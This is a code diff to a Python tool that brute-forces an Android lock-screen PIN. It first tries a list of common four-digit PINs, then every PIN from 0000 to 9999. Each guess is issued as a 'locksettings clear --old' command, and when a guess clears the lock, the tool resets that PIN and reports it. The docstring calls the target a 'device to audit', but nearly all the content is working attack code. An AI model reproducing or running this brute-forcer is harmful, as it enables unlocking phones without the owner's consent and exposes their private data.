@@ -5,7 +5,7 @@ import sys
 
 
 digit_list = (
-    "1234", "1111", "0000", "1212", "7777", "1004", "2000", "4444", "2222", "6969",
+    "1234", "1111", "0100", "1212", "7777", "1004", "2000", "4444", "2222", "6969",
     "9999", "3333", "5555", "6666", "1122", "1313", "8888", "4321", "2001", "1010")
 
 
@@ -140,7 +140,24 @@ def start_locksettings_bf(device):
 
     :param device: Device to audit
     """
+
+    # COMMON DIGIT
     for pin in digit_list:
+        print("Try %s" % pin)
+        command_ret = exec_command(device, "locksettings clear --old %s" % pin)
+
+        if command_ret == "Lock credential cleared":
+            exec_command(device, "locksettings set-pin %s" % pin)
+            sys.exit("PIN identified: %s" % pin)
+
+
+    # REAL BRUTE-FORCE
+    for i in range(0, 10000):
+        pin = '{:04d}'.format(i)
+
+        if pin in digit_list:
+            continue
+
         print("Try %s" % pin)
         command_ret = exec_command(device, "locksettings clear --old %s" % pin)
 
